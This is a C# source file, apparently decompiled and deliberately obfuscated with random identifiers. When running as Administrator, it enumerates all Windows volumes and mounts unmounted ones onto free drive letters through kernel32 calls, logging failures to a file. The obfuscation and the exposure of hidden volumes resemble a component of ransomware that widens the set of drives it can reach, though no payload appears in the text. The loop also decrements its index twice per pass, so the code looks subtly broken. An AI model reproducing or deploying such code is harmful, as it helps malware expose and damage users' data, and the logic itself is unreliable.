using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace dfbDZtGQEYGzK;

public static class pmodLucENaC
{
	public enum hMJkMRmynCwoS : uint
	{
		hXpNaQoFtSoAy,
		FSjmyKalZEyBfOc,
		RYCBtemXyilVZ,
		HZuNrpfJbdzMB,
		ookxzNKMCzXuKAcjK,
		dXPFsiBEUxUAA,
		DXtAVrqyMdjSpF
	}

	[CompilerGenerated]
	private sealed class tuJdOiUbDQ
	{
		public uint aoaLgCOrXvqaj;

		public uint KwSzMtuRYmfo;

		public char[] jlJgiuvDXIRfqiAp;

		public bool _003CMountVolumes_003Eb__0(string volumeName)
		{
			if (GetVolumePathNamesForVolumeNameW(volumeName, jlJgiuvDXIRfqiAp, KwSzMtuRYmfo, ref aoaLgCOrXvqaj))
			{
				return jlJgiuvDXIRfqiAp.Length != 3;
			}
			return true;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern hMJkMRmynCwoS GetDriveType([MarshalAs(UnmanagedType.LPStr)] string PBGGCWvLUdlWeKG);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string rYQEXXpkYyTYiNZ, char[] iGQWjXNLIBUVv, uint ydiDqBpdLvQEMhpuc, ref uint pvRUGXZoNbJCs);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string oNYoWlHWjkI, string qxgwkozXyLI);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder UocsHmQsoAqNnKO, int lhZEeUTqbPkZAbD);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int jnAlAwWCqVuwyV, StringBuilder kzxXOCMvlPENny, int KHuVzgIILvcz);

	public static List<string> SrgkstScLgcrHEJ()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int jnAlAwWCqVuwyV = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(jnAlAwWCqVuwyV, stringBuilder, 1024));
		return list;
	}

	public static void WkbyvRQCdtG()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			string[] array = new string[26]
			{
				"Q:\\", "W:\\", "E:\\", "R:\\", "T:\\", "Y:\\", "U:\\", "I:\\", "O:\\", "P:\\",
				"A:\\", "S:\\", "D:\\", "F:\\", "G:\\", "H:\\", "J:\\", "K:\\", "L:\\", "Z:\\",
				"X:\\", "C:\\", "V:\\", "B:\\", "N:\\", "M:\\"
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == hMJkMRmynCwoS.FSjmyKalZEyBfOc)
				{
					array2[num++] = text;
				}
			}
			List<string> source = SrgkstScLgcrHEJ();
			uint aoaLgCOrXvqaj = 0u;
			uint KwSzMtuRYmfo = 120u;
			char[] jlJgiuvDXIRfqiAp = new char[260];
			foreach (string item in source.Where((string volumeName) => !GetVolumePathNamesForVolumeNameW(volumeName, jlJgiuvDXIRfqiAp, KwSzMtuRYmfo, ref aoaLgCOrXvqaj) || jlJgiuvDXIRfqiAp.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (sWSXzQkxHH.hzzRDIjGDyq)
				{
					try
					{
						Console.WriteLine("Drive Mounted: {0}", array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (sWSXzQkxHH.bZJnUpHOpIgqq)
			{
				try
				{
					File.AppendAllText(sWSXzQkxHH.SlCyjezmzcjRF, "Error while mounting network drives: " + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
